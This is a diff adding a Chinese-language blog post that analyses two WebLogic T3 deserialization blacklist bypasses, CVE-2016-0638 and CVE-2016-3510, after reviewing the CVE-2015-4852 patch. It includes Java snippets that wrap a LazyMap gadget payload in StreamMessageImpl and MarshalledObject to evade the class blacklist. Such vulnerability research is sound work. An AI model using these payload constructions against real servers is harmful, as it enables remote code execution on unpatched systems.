@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  
+<meta name="description" content="CVE-2016-0638 是前面分析的 CVE-2015-4852 的一个绕过，通过找到一个不在黑名单中的类，且这个类存在readObject&#x2F;readResolve&#x2F;readExternal 方法，并且恰好这些方法里面有一些数据进行反序列化操作，那么这时我们就可以把原生的序列化数据封装到这个类里面，通过调用反序列化对象重写的readObject&#x2F;readResolve&#x2F;readExternal">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WebLogic基于T3协议的反序列化 CVE20163510 CVE20160638">
+<meta property="og:url" content="http://example.com/2022/01/29/CVE20160638andCVE20163510/index.html">
+<meta property="og:site_name" content="ky0127">
+<meta property="og:description" content="CVE-2016-0638 是前面分析的 CVE-2015-4852 的一个绕过，通过找到一个不在黑名单中的类，且这个类存在readObject&#x2F;readResolve&#x2F;readExternal 方法，并且恰好这些方法里面有一些数据进行反序列化操作，那么这时我们就可以把原生的序列化数据封装到这个类里面，通过调用反序列化对象重写的readObject&#x2F;readResolve&#x2F;readExternal">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128202843340.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204003976.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204124947.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204655232.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204934385.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128205420340.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220129011919745.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128211420511.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220129004852855.png">
+<meta property="og:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128225312859.png">
+<meta property="article:published_time" content="2022-01-28T17:26:26.813Z">
+<meta property="article:modified_time" content="2022-01-28T17:28:10.088Z">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128202843340.png">
+
+<link rel="canonical" href="http://example.com/2022/01/29/CVE20160638andCVE20163510/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>WebLogic基于T3协议的反序列化 CVE20163510 CVE20160638 | ky0127</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <a target="_blank" rel="noopener" href="https://github.com/ky0103" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner">
+<div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      
+
+
+      <h1 class="site-title" id="OnlySiteTitle"></h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  	<script>
+    Date.prototype.format = function(format)
+    {
+    var o = {
+    "M+" : this.getMonth()+1, //month
+    "d+" : this.getDate(),    //day
+    "h+" : this.getHours(),   //hour
+    "m+" : this.getMinutes(), //minute
+    "s+" : this.getSeconds(), //second
+    "q+" : Math.floor((this.getMonth()+3)/3),  //quarter
+    "S" : this.getMilliseconds() //millisecond
+    }
+    if(/(y+)/.test(format)) format=format.replace(RegExp.$1,
+    (this.getFullYear()+"").substr(4 - RegExp.$1.length));
+    for(var k in o)if(new RegExp("("+ k +")").test(format))
+    format = format.replace(RegExp.$1,
+    RegExp.$1.length==1 ? o[k] :
+    ("00"+ o[k]).substr((""+ o[k]).length));
+    return format;
+    }
+
+    var d1 = new Date();
+    d1 = d1.format('yyyy-MM-dd').replace("-","").replace("-","").slice(4);
+    document.getElementById("OnlySiteTitle").innerHTML = "ky"+d1;
+  </script>
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/29/CVE20160638andCVE20163510/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ky0127">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WebLogic基于T3协议的反序列化 CVE20163510 CVE20160638
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-01-29 01:26:26 / Modified: 01:28:10" itemprop="dateCreated datePublished" datetime="2022-01-29T01:26:26+08:00">2022-01-29</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+
+
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>CVE-2016-0638 是前面分析的 CVE-2015-4852 的一个绕过，通过找到一个不在黑名单中的类，且这个类存在<code>readObject/readResolve/readExternal</code> 方法，并且恰好这些方法里面有一些数据进行反序列化操作，那么这时我们就可以把原生的序列化数据封装到这个类里面，通过调用反序列化对象重写的<code>readObject/readResolve/readExternal</code> 方法这一特点来反序列化封装在类里面的原生序列化数据。</p>
+<h2 id="修复环境搭建"><a href="#修复环境搭建" class="headerlink" title="修复环境搭建"></a>修复环境搭建</h2><p>因为这里的 CVE-2016-0638 是 CVE-2015-4852 的一个绕过，所以这里需要在前面那个 docker 环境中打上补丁，以此来分析 WebLogic 的补丁到底打到了那里。</p>
+<p>环境搭建参考这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a></p>
+<p>如果按照上面文章搭建报如下错误</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128202843340.png" alt="image-20220128202843340"></p>
+<p>则需要把<code>EJUM.jar/patch-catalog_22958.xml</code>这两个文件从<code>p20780171_1036_Generic</code>目录拷贝到<code>/u01/app/oracle/middleware/utils/bsu/cache_dir/</code>目录下</p>
+<p>补丁下载参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hmhhz/p/11422019.html">https://www.cnblogs.com/hmhhz/p/11422019.html</a></p>
+<h2 id="CVE-2015-4852的防御"><a href="#CVE-2015-4852的防御" class="headerlink" title="CVE-2015-4852的防御"></a>CVE-2015-4852的防御</h2><p>先来看下 WebLogic 对 CVE-2015-4852 反序列化漏洞的防御，在安装好补丁之后用前面的脚本打目标服务器，发现无法成功创建文件，把断点下在 <code>ServerChannelInputStream#resolveClass</code> 方法上，可以看到这里多了一个黑名单检查</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204003976.png" alt="image-20220128204003976"></p>
+<p>咋们跟进一下 <code>ClassFilter#isBlackListed</code> 方法，<code>ClassFilter</code> 这个类有静态代码块，那么先来看下静态代码块</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204124947.png" alt="image-20220128204124947"></p>
+<p>这里应该是判断有无设置一些参数为 true</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204655232.png" alt="image-20220128204655232"></p>
+<p>根据判断设置的参数情况来添加相应的类到黑名单里面，最终我这里的黑名单类为如下</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128204934385.png" alt="image-20220128204934385"></p>
+<p>然后 <code>isBlackListed</code> 方法判断传入的类名是否存在于类黑名单中，如果存在则直接返回 true 了，如果不存在则截取包名，再判断包名是否存在类黑名单中，在这里的过滤的类黑名单中没有<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 类在里面</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128205420340.png" alt="image-20220128205420340"></p>
+<p>虽然 <code>AnnotationInvocationHandler</code> 类不在类黑名单里面，但是一些Gadget所用到的类在黑名单里面，而在<code>AnnotationInvocationHandler</code> 类直接通过 <code>InboundMsgAbbrev#readObject</code> 进行反序列化的过程中会再次调用到 <code>ServerChannelInputStream#resolveClass</code> 方法来处理比如 <code>org.apache.commons.collections.map.LazyMap</code> 类，而这个类会被黑名单检测到 ，这样一来自然就被拦截了</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220129011919745.png" alt="image-20220129011919745"></p>
+<p>除了这里有检测之外，<code>MsgAbbrevInputStream#resolveClass</code> 方法也存在检测，不过检测的手段都是一样的，就不再赘述。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128211420511.png" alt="image-20220128211420511"></p>
+<h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>这篇的开头也说了其中的一种绕过思路了，就是找一个存在 <code>readObject/readResolve/readExternal</code> 方法的类，且这个类的这些方法里面又调用了 <code>ObjectInputStream#readObject</code> 方法来反序列化一些数据，我们只需要把真正的 payload 封装在类里面，这样就绕过了黑名单的检测。</p>
+<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>这里的绕过用到的是 <code>StreamMessageImpl</code> 类，这个类存在 <code>readExternal</code> 方法，且这个方法调用了 <code>ObjectInputStream#readObject</code>方法来反序列化从输入流中读取出来的数据。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220129004852855.png" alt="image-20220129004852855"></p>
+<p>要让 <code>var3</code> 为1，  <code>var4</code> 为恶意序列化数据，这里通过重写 <code>StreamMessageImpl#writeExternal</code> 方法，在构造 payload 的项目创建 <code>weblogic.jms.common</code> 包，并增加两个属性和三个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] buffer;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] getDataBuffer() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.bdos != <span class="keyword">null</span> ? <span class="keyword">this</span>.bdos.getBuffer() : <span class="keyword">this</span>.buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getDataSize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.bdos != <span class="keyword">null</span> ? <span class="keyword">this</span>.bdos.size() : <span class="keyword">this</span>.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setDataBuffer</span><span class="params">(<span class="keyword">byte</span>[] var1, <span class="keyword">int</span> var2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.buffer = var1;</span><br><span class="line">    <span class="keyword">this</span>.length = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>重写 <code>writeExternal</code> 方法，手工写入值为1的 byte 数据和恶意的序列化数据，这样在调用到 <code>StreamMessageImpl#readExternal</code> 方法的时候就可以调用到 <code>readObject</code> 方法，并且 <code>var4</code> 为恶意的序列化数据。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeExternal</span><span class="params">(ObjectOutput paramObjectOutput)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.writeExternal(paramObjectOutput);</span><br><span class="line">    paramObjectOutput.writeByte(<span class="number">1</span>);</span><br><span class="line">    paramObjectOutput.writeInt(getDataSize());</span><br><span class="line">    paramObjectOutput.write(getDataBuffer());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造 payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) Collections01LazyMap.getObject();</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = SerWithUnSer.serialize(invocationHandler,<span class="keyword">false</span>);</span><br><span class="line">    StreamMessageImpl streamMessage = <span class="keyword">new</span> StreamMessageImpl();</span><br><span class="line">    streamMessage.setDataBuffer(bytes,bytes.length);</span><br><span class="line">    <span class="keyword">return</span> streamMessage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对一些序列化的过程进行了封装，不过原理都是一样的。</p>
+<h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>CVE-2016-3510 用到的是 <code>MarshalledObject#readResolve </code>方法，看一下这个方法的逻辑。</p>
+<p><img src="https://gitee.com/KiiTyl/java_images/raw/master/java_images/image-20220128225312859.png" alt="image-20220128225312859"></p>
+<p><code>objBytes</code> 属性是一个对象，对这个属性对象使用 <code>readObject</code> 方法，那么也就很明显了，把恶意对象封装到 <code>MarshalledObject</code> 类的 <code>objBytes</code> 属性中即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) Collections01LazyMap.getObject();</span><br><span class="line">    MarshalledObject marshalledObject = <span class="keyword">new</span> MarshalledObject(invocationHandler);</span><br><span class="line">    <span class="keyword">return</span> marshalledObject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成序列化文件之后用前面的 cve-2015-4852 打就行</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14207435.html">https://www.cnblogs.com/nice0e3/p/14207435.html</a><br><a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">文章略显粗糙,不恰当的地方恳请师傅们指正!</div>
+    
+</div>
+
+      
+    </div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/28/CVE20154582/" rel="prev" title="WebLogic基于T3协议的反序列化 CVE-2015-4582">
+      <i class="fa fa-chevron-left"></i> WebLogic基于T3协议的反序列化 CVE-2015-4582
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">修复环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2015-4852%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="nav-number">2.</span> <span class="nav-text">CVE-2015-4852的防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="nav-number">3.</span> <span class="nav-text">绕过思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-0638"><span class="nav-number">4.</span> <span class="nav-text">CVE-2016-0638</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-3510"><span class="nav-number">5.</span> <span class="nav-text">CVE-2016-3510</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name"></p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+<script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
+
+<script>
+var options = {
+  bottom: '64px',
+  right: 'unset',
+  left: '32px',
+  time: '0.5s',
+  mixColor: 'transparent',
+  backgroundColor: 'transparent',
+  buttonColorDark: '#100f2c',
+  buttonColorLight: '#fff',
+  saveInCookies: false,
+  label: '🌓',
+  autoMatchOsTheme: false
+}
+const darkmode = new Darkmode(options);
+window.darkmode = darkmode;
+darkmode.showWidget();
+if (window.darkmode && !window.darkmode.isActivated()) {
+  window.darkmode.toggle();
+  var toggleButtons = document.getElementsByClassName("darkmode-toggle");
+  for (i = 0; i < toggleButtons.length; i++) {
+    toggleButtons[i].classList.add("darkmode-toggle--white");
+  }
+}
+</script>
+
+</body>
+</html>
